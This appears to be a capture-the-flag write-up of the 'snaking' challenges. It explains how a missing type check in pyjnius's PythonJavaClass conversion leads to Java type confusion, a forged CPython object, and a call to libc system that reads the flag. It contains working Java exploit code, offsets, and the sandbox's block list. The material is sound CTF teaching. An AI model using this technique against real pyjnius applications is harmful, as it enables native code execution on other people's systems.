L19: ## Snaking Revenge
L20: 
L21: by 【16†andso】 / 【17†RubiyaLab】
L22: 
L23: Rating:
L24: 
L25: Original Blog Link: [snaking](【18†https://www.andsopwn.com/ctf/sas26_snaking/†www.andsopwn.com】)
L26: 
L27: I solved `snaking` first, then looked at `snaking revenge`. I wrote both up here.
L28: The bug is in the Python/Java boundary of pyjnius. At first I treated the challenge like a Java sandbox escape, because the server asks for a JAR. But the program literally prints the libc base address, so the direction changed pretty quickly: use a pyjnius object confusion to reach native code execution.
L29: ## Overview
L30: 
L31: The wrapper accepts a user-supplied JAR, puts it in `CLASSPATH`, and runs `【19†main.py†main.py】`.
L32: 
L33: Inside `【19†main.py†main.py】`, pyjnius loads classes such as `requester.HttpClient` and `requester.Request$Builder` from that JAR. The call I cared about was this:
L34: 
L35: ```python
L36: client_builder.proxyAuthenticator(
L37: ProxyAuthenticator.from_creds(args.proxy.username, args.proxy.password)
L38: )
L39: ```
L40: `ProxyAuthenticator` is a Python class exported as a Java interface using pyjnius. If the proxy URL contains a username and password, a `PythonJavaClass` object is passed into a Java method from my JAR.
L41: 
L42: Component-wise, the challenge looks like this:
L43: ```mermaid
L44: flowchart LR
L45: user[【20†solver.py†solver.py】] -->|base64 zlib JAR| wrapper[【21†wrapper.py†wrapper.py】]
L46: user -->|url / proxy| wrapper
L47: wrapper -->|writes requester.jar| jar["/tmp/.../requester.jar"]
L48: wrapper -->|CLASSPATH=requester.jar| main[【19†main.py†main.py】]
L49: main -->|autoclass requester.*| attacker[attacker-controlled Java classes]
L50: main -->|proxy creds present| pycls[ProxyAuthenticator PythonJavaClass]
L51: pycls -->|pyjnius argument conversion| builder[HttpClient.Builder.proxyAuthenticator]
L52: builder --> exploit[Exploit.run]
L53: ```
L54: After that, the exploit chain was:
L55: 
L56: ```text
L57: PythonJavaClass argument type check missing
L58: -> Java dynamic proxy passed as FakeProxy
L59: -> fake field layout over java.lang.reflect.Proxy
L60: -> NativeInvocationHandler.ptr read/write
L61: -> scan Java heap through fake long fields
L62: -> find DirectByteBuffer.address
L63: -> place fake PyObject in native direct-buffer memory
L64: -> fake PyTypeObject.tp_getattro = libc.system
L65: -> trigger proxy toString()
L66: -> py_obj.invoke attribute lookup
L67: -> system(" cat f*")
L68: ```
L69: For `snaking revenge`, the patch tightens the sandbox, but it does not fix the pyjnius conversion bug. I only needed a cleaner Java payload, a wider heap scan, and one extra direct buffer tag.
L70: ## Part 1: snaking
L71: ### Getting into the callback
L72: 
L73: This path only runs when the proxy URL contains credentials:
L74: 
L75: ```text
L76: http://user:【22†[email protected]】:9
L77: ```
L78: 
L79: Without `user:pass`, `【19†main.py†main.py】` never calls `proxyAuthenticator()`.
L80: 
L81: The Python side defines the authenticator as a `PythonJavaClass`:
L82: 
L83: ```python
L84: class ProxyAuthenticator(PythonJavaClass):
L85: __javainterfaces__ = ['requester.ProxyAuthenticator']
L86: @classmethod
L87: def from_creds(cls, username: str | None = None, password: str | None = None) -> 'ProxyAuthenticator':
L88: self = cls.__new__(cls)
L89: self._username = username
L90: self._password = password
L91: return self
L92: 
L93: @java_method('(Lrequester/Request;)V')
L94: def authenticate(self, request) -> None:
L95: print("todo...")
L96: ```
L97: 
L98: Since my JAR defines `requester.HttpClient`, I also control the builder method that receives this object.
L99: 
L100: I expected this method to use the declared interface:
L101: ```java
L102: public Builder proxyAuthenticator(ProxyAuthenticator auth) {
L103: ...
L104: }
L105: ```
L106: 
L107: But pyjnius lets me write this instead:
L108: 
L109: ```java
L110: public Builder proxyAuthenticator(FakeProxy auth) {
L111: Exploit.run(auth);
L112: return this;
L113: }
L114: ```
L115: 
L116: This was the bug I needed.
L117: ### pyjnius argument conversion
L118: 
L119: The useful code is `populate_args()` in `jnius_conversion.pxi`.
L120: 
L121: For normal Java objects, pyjnius checks whether the object is assignable to the Java parameter type:
L122: 
L123: ```cython
L124: elif isinstance(py_arg, JavaClass):
L125: jc = py_arg
L126: check_assignable_from(j_env, jc, argtype[1:-1])
L127: j_args[index].l = jc.j_self.obj
L128: ```
L129: 
L130: For `PythonJavaClass`, it does not:
L131: ```cython
L132: elif isinstance(py_arg, PythonJavaClass):
L133: pc = py_arg
L134: jc = pc.j_self
L135: if jc is None:
L136: pc._init_j_self_ptr()
L137: jc = pc.j_self
L138: j_args[index].l = jc.j_self.obj
L139: ```
L140: 
L141: That missing check is the whole bug.
L142: 
L143: I tried a normal Java object type confusion first, by making another callback receive some fake request type. That fails because the argument is a normal `JavaClass`, so `check_assignable_from()` catches it.
L144: But `ProxyAuthenticator` is a `PythonJavaClass`. That branch just extracts the backing Java proxy object and passes it as-is.
L145: 
L146: At that point, my Java code is looking at a real object whose runtime class is similar to:
L147: 
L148: ```text
L149: jdk.proxy1.$Proxy0 extends java.lang.reflect.Proxy
L150: ```
L151: 
L152: but the method signature says:
L153: 
L154: ```text
L155: requester.FakeProxy
L156: ```
L157: ### Turning the confusion into ptr access
L158: 
L159: Java dynamic proxy objects extend `java.lang.reflect.Proxy`, which contains:
L160: 
L161: ```java
L162: protected InvocationHandler h;
L163: ```
L164: 
L165: pyjnius stores an `org.jnius.NativeInvocationHandler` in that field. Its source is roughly:
L166: 
L167: ```java
L168: public class NativeInvocationHandler implements InvocationHandler {
L169: private long ptr;
L170: 
L171: public NativeInvocationHandler(long ptr) {
L172: this.ptr = ptr;
L173: }
L174: public Object invoke(Object proxy, Method method, Object[] args) {
L175: return invoke0(proxy, method, args);
L176: }
L177: 
L178: native Object invoke0(Object proxy, Method method, Object[] args);
L179: }
L180: ```
L181: 
L182: Direct access to `org.jnius.NativeInvocationHandler` is blocked by `jnius.security`, but I do not need to name that class.
L183: 
L184: I can define fake classes with the same first fields:
L185: 
L186: ```java
L187: public class FakeNative {
L188: public long ptr;
L189: }
L190: 
L191: public class FakeProxy {
L192: public FakeNative h;
L193: public long qword0;
L194: public long qword1;
L195: ...
L196: }
L197: ```
L198: The confusing part is that there is only one real object. Java just gives me the wrong static view of it:
L199: 
L200: ```mermaid
L201: flowchart TB
L202: real["real object: jdk.proxy1.$Proxy0"]
L203: proxyh["java.lang.reflect.Proxy.h"]
L204: native["real object: org.jnius.NativeInvocationHandler"]
L205: ptr["NativeInvocationHandler.ptr"]
L206: 
L207: fake["static view: requester.FakeProxy"]
L208: fakeh["FakeProxy.h"]
L209: fakenative["static view: requester.FakeNative"]
L210: fakeptr["FakeNative.ptr"]
L211: real --> proxyh --> native --> ptr
L212: fake --> fakeh --> fakenative --> fakeptr
L213: 
L214: fakeh -. same field offset .-> proxyh
L215: fakeptr -. same field offset .-> ptr
L216: ```
L217: 
L218: Because Java believes `auth` is a `FakeProxy`, `auth.h` reads the field at the offset of `FakeProxy.h`. That offset lines up with `java.lang.reflect.Proxy.h` in the real object.
L219: 
L220: The returned object is actually a `NativeInvocationHandler`, but Java sees it as `FakeNative`. Then `auth.h.ptr` reads and writes the real `NativeInvocationHandler.ptr`.
L221: That gives this small primitive:
L222: 
L223: ```java
L224: FakeNative handler = auth.h;
L225: long oldPtr = handler.ptr;
L226: handler.ptr = newPtr;
L227: ```
L228: 
L229: `oldPtr` is the original Python object pointer for the `ProxyAuthenticator` instance. `newPtr` can be any address I want pyjnius to treat as a Python object.
L230: ### What ptr is used for
L231: 
L232: The native callback path in `jnius_proxy.pxi` reads the `ptr` field and casts it into a Python object:
L233: 
L234: ```cython
L235: cdef jobject py_invoke0(JNIEnv *j_env, jobject j_this, jobject j_proxy,
L236: jobject j_method, jobjectArray args) except * with gil:
L237: ...
L238: ptrField = j_env[0].GetFieldID(j_env,
L239: j_env[0].GetObjectClass(j_env, j_this), "ptr", "J")
L240: jptr = j_env[0].GetLongField(j_env, j_this, ptrField)
L241: py_obj = <object><void *>jptr
L242: ...
L243: ret = py_obj.invoke(method, *py_args)
L244: ```
L245: No sanity check is done on `jptr`.
L246: 
L247: At this point I needed native memory that I could write from Java. Once the fake object is ready, the callback path is short:
L248: 
L249: ```mermaid
L250: sequenceDiagram
L251: participant Java as Java exploit code
L252: participant Proxy as dynamic proxy object
L253: participant Handler as NativeInvocationHandler
L254: participant Jnius as pyjnius invoke0
L255: participant CPython as CPython attribute lookup
L256: participant Libc as libc.system
L257: Java->>Handler: handler.ptr = fakeObj
L258: Java->>Proxy: ((Object) auth).toString()
L259: Proxy->>Handler: invoke(proxy, method, args)
L260: Handler->>Jnius: invoke0(...)
L261: Jnius->>Jnius: py_obj = (PyObject *)ptr
L262: Jnius->>CPython: py_obj.invoke
L263: CPython->>Libc: tp_getattro(fakeObj, "invoke")
L264: ```
L265: ### Finding writable native memory
L266: 
L267: `ByteBuffer.allocateDirect()` is useful because it allocates native backing memory and lets Java write to it:
L268: 
L269: ```java
L270: ByteBuffer buf = ByteBuffer.allocateDirect(0x1337);
L271: buf.order(ByteOrder.LITTLE_ENDIAN);
L272: ```
L273: 
L274: Java can write controlled qwords into this buffer:
L275: 
L276: ```java
L277: buf.putLong(offset, value);
L278: ```
L279: 
L280: CPython can later read the same memory as normal native memory if I know the backing address.
L281: 
L282: I first tried the normal ways to ask Java for the address:
L283: ```java
L284: ((sun.nio.ch.DirectBuffer) buf).address()
L285: sun.misc.Unsafe.getUnsafe()
L286: jdk.internal.misc.Unsafe.getUnsafe()
L287: jdk.internal.access.SharedSecrets.getJavaNioAccess().getBufferAddress(buf)
L288: buf.getClass().getMethod("address").invoke(buf)
L289: ```
L290: 
L291: I ended up reusing the type confusion as a very ugly heap scanner.
L292: 
L293: `FakeProxy` contains thousands of fake `long` fields:
L294: 
L295: ```java
L296: public class FakeProxy {
L297: public FakeNative h;
L298: public long qword0;
L299: public long qword1;
L300: ...
L301: public long qword6999;
L302: }
L303: ```
L304: The real proxy object is much smaller than that. Reading those fields walks past the real object and interprets nearby Java heap memory as qwords.
L305: 
L306: Ugly, but enough to find a nearby `DirectByteBuffer` object.
L307: ### Identifying DirectByteBuffer
L308: 
L309: Locally, on the same Java 21 layout, the base `java.nio.Buffer` fields looked like this:
L310: 
L311: ```text
L312: java.nio.Buffer
L313: mark int offset 12
L314: address long offset 16
L315: position int offset 24
L316: limit int offset 28
L317: capacity int offset 32
L318: ```
L319: 
L320: For:
L321: 
L322: ```java
L323: ByteBuffer.allocateDirect(0x1337);
L324: ```
L325: 
L326: the object contains:
L327: 
L328: ```text
L329: mark = -1
L330: address = native backing memory address
L331: position = 0
L332: limit = 0x1337
L333: capacity = 0x1337
L334: ```
L335: 
L336: I searched for that tagged layout:
L337: ```java
L338: if (Scanner.addr == 0 &&
L339: p.qword[i - 4] == 1L &&
L340: (p.qword[i - 3] >>> 32) == 0xffffffffL &&
L341: (p.qword[i - 1] >>> 32) == 0x1337L &&
L342: (p.qword[i] & 0xffffffffL) == 0x1337L) {
L343: Scanner.addr = p.qword[i - 2];
L344: }
L345: ```
L346: 
L347: `p.qword[i - 2]` is the `address` field.
L348: 
L349: That was enough to recover the direct buffer backing address from Java, without calling any blocked internal API.
L350: ### Forging a PyObject
L351: 
L352: CPython objects begin with:
L353: 
L354: ```c
L355: typedef struct _object {
L356: Py_ssize_t ob_refcnt;
L357: PyTypeObject *ob_type;
L358: } PyObject;
L359: ```
L360: 
L361: I only filled the fields needed to survive until attribute lookup. The fake object points to a fake type object, and that fake type object has `tp_getattro = system`.
L362: 
L363: On the target Python 3.12 build, `tp_getattro` was at offset `144` inside `PyTypeObject`.
L364: 
L365: The direct buffer memory is laid out like this:
L366: ```text
L367: fakeObj + 0x00: ob_refcnt, also command bytes
L368: fakeObj + 0x08: ob_type = fakeObj + 0x100
L369: 
L370: fakeObj + 0x100: fake PyTypeObject
L371: fakeObj + 0x100 + 144: tp_getattro = libc.system
L372: ```
L373: 
L374: Java writes it like this:
L375: 
L376: ```java
L377: private static void fakeObject(ByteBuffer buf, long fakeObj, long system) {
L378: long fakeType = fakeObj + 0x100;
L379: 
L380: buf.putLong(0, 0x002a66207461631fL);
L381: buf.putLong(8, fakeType);
L382: for (int i = 0x10; i < 0x200; i += 8) {
L383: buf.putLong(i, 0);
L384: }
L385: buf.putLong(0x100 + 144, system);
L386: }
L387: ```
L388: The first qword is both `ob_refcnt` and the command string.
L389: 
L390: `0x002a66207461631f` is little endian:
L391: 
L392: ```text
L393: 1f 63 61 74 20 66 2a 00
L394: ```
L395: 
L396: At first it is:
L397: 
L398: ```text
L399: \x1fcat f*
L400: ```
L401: 
L402: When Cython executes:
L403: 
L404: ```cython
L405: py_obj = <object><void *>jptr
L406: ```
L407: 
L408: it increments the reference count. Since `ob_refcnt` is the first qword, the first byte increases by one:
L409: 
L410: ```text
L411: 1f 63 61 74 20 66 2a 00
L412: 20 63 61 74 20 66 2a 00
L413: ```
L414: 
L415: After that one `INCREF`, the fake object starts with:
L416: 
L417: ```text
L418: cat f*
L419: ```
L420: The leading space is harmless for `/bin/sh -c`.
L421: ### Triggering system
L422: 
L423: After replacing `NativeInvocationHandler.ptr`, I trigger any proxy method:
L424: 
L425: ```java
L426: handler.ptr = fakeObj;
L427: ((Object) auth).toString();
L428: ```
L429: 
L430: The dynamic proxy dispatches to `NativeInvocationHandler.invoke()`, which calls the native `invoke0()` path. pyjnius casts `ptr` to `py_obj` and then runs:
L431: 
L432: ```cython
L433: ret = py_obj.invoke(method, *py_args)
L434: ```
L435: 
L436: Before calling anything, CPython has to resolve the `invoke` attribute:
L437: 
L438: ```c
L439: Py_TYPE(py_obj)->tp_getattro(py_obj, "invoke")
L440: ```
L441: The fake type object has:
L442: 
L443: ```text
L444: tp_getattro = system
L445: ```
L446: 
L447: The function pointer type does not match, but that is fine for this one call on x86_64 SysV. CPython passes the fake object pointer as the first argument, and `system()` interprets it as a `char *`.
L448: 
L449: The call is basically:
L450: 
L451: ```c
L452: system(fakeObj);
L453: ```
L454: 
L455: In practice, that becomes:
L456: 
L457: ```sh
L458: system(" cat f*")
L459: ```
L460: The process usually dies after printing the flag because `system()` returns an `int`, while CPython expects a `PyObject *`. The flag is already out by then.
L461: ### Final exploit
L462: 
L463: `【23†solve.py†solve.py】` only keeps the remote path. It builds the JAR, sends it, parses the gift, sends `system`, and prints the flag.
L464: 
L465: The wrapper only reads three input lines:
L466: 
L467: ```text
L468: JAR source:
L469: --url:
L470: --proxy:
L471: ```
L472: 
L473: but the child process inherits the same stdin. I used that to send one more line after the proxy URL:
L474: 
L475: ```text
L476: base64(zlib(jar))
L477: 【24†http://example.com/†example.com】
L478: http://user:【22†[email protected]】:9
L479: <computed system address>
L480: ```
L481: 
L482: The program prints the libc base:
L483: ```python
L484: def gift():
L485: """ Should've brute-forced 12 bits, but I'm feeling nice today :P """
L486: with open("/proc/self/maps", "r") as f:
L487: for line in f:
L488: if "libc.so.6" in line:
L489: print("Gift:", f'0x{line.split("-")[0]}')
L490: break
L491: ```
L492: 
L493: On the target libc, `system` was
L494: ```text
L495: system@@GLIBC_2.2.5 = 0x58750
L496: ```
L497: 
L498: ```python
L499: system = libc_base + 0x58750
L500: ```
L501: 
L502: Output:
L503: 
L504: ```text
L505: $ python3 【23†solve.py†solve.py】

L508: ## Part 2: snaking revenge
L509: ### What changed
L510: 
L511: `snaking revenge` hardens the Java-side sandbox.
L512: 
L513: The new `jnius.security` blocks many more packages, including:
L514: 
L515: ```text
L516: jdk.
L517: sun.
L518: java.lang.reflect.
L519: java.lang.foreign.
L520: java.lang.invoke.
L521: java.lang.instrument.
L522: java.lang.ProcessBuilder
L523: java.lang.Runtime
L524: com.sun.
L525: org.graalvm.
L526: ```
L527: 
L528: It also adds `package.definition` rules for core Java packages and `requester.`.
L529: 
L530: The JVM also gets:
L531: 
L532: ```python
L533: f'--enable-native-access={urandom(16).hex()}'
L534: ```
L535: It only prints a warning about an unknown module. I was not using Java FFM or native-access APIs, so it did not affect the exploit.
L536: 
L537: For this exploit, only one thing mattered: the pyjnius `PythonJavaClass` conversion bug stayed there.
L538: ### Fixing the payload
L539: 
L540: The old primitive still works:
L541: 
L542: ```text
L543: PythonJavaClass -> FakeProxy -> FakeNative.ptr -> fake PyObject
L544: ```
L545: 
L546: The revenge delta was only around the payload stability:
L547: 
L548: ```mermaid
L549: flowchart TD
L550: base[snaking exploit] --> same[pyjnius primitive unchanged]
L551: same --> no_concat[remove Java string concat]
L552: same --> wide_scan[widen qword scanner]
L553: same --> two_tags[add 0x1337 and 0x1441 DirectByteBuffer tags]
L554: no_concat --> revenge[revenge flag]
L555: wide_scan --> revenge
L556: two_tags --> revenge
L557: ```
L558: I only had to change three things for revenge.
L559: 
L560: First, I removed Java string concatenation from debug output. On Java 21, `"a" + b` goes through `invokedynamic` and `java.lang.invoke.StringConcatFactory`. Since revenge blocks `java.lang.invoke.`, even harmless debug output can crash the payload.
L561: 
L562: Second, I widened the heap scan. The original scan was:
L563: 
L564: ```python
L565: QWORDS = 7000
L566: SCAN_FROM = 0
L567: SCAN_TO = 6500
L568: ```
L569: 
L570: I changed it to
L571: ```python
L572: QWORDS = 24000
L573: SCAN_FROM = 0
L574: SCAN_TO = 22000
L575: ```
L576: Third, I added a second direct buffer tag:
L577: 
L578: ```java
L579: ByteBuffer buf = ByteBuffer.allocateDirect(0x1337);
L580: ByteBuffer pad = ByteBuffer.allocateDirect(0x1441);
L581: ```
L582: 
L583: The scanner accepts either tag:
L584: 
L585: ```java
L586: // 0x1337 tag
L587: (p.qword[i - 1] >>> 32) == 0x1337L &&
L588: (p.qword[i] & 0xffffffffL) == 0x1337L
L589: 
L590: // 0x1441 tag
L591: (p.qword[i - 1] >>> 32) == 0x1441L &&
L592: (p.qword[i] & 0xffffffffL) == 0x1441L
L593: ```
L594: 
L595: and the fake object is written to both buffers:
L596: ```java
L597: fakeObject(buf, fakeObj, system);
L598: fakeObject(pad, fakeObj, system);
L599: ```
L600: 
L601: Then whichever direct buffer object gets found, the selected native address contains the fake object.
L602: ### Final revenge exploit
L603: 
L604: The revenge solver stays almost identical to the original one:
L605: 
L606: 1. Build a JAR with attacker-controlled `requester.*` classes.
L607: 2. Send URL and proxy credentials to hit `proxyAuthenticator()`.
L608: 3. Parse `Gift: 0x...`.
L609: 4. Send `libc_base + 0x58750`.
L610: 5. Trigger pyjnius callback through the forged `ptr`.
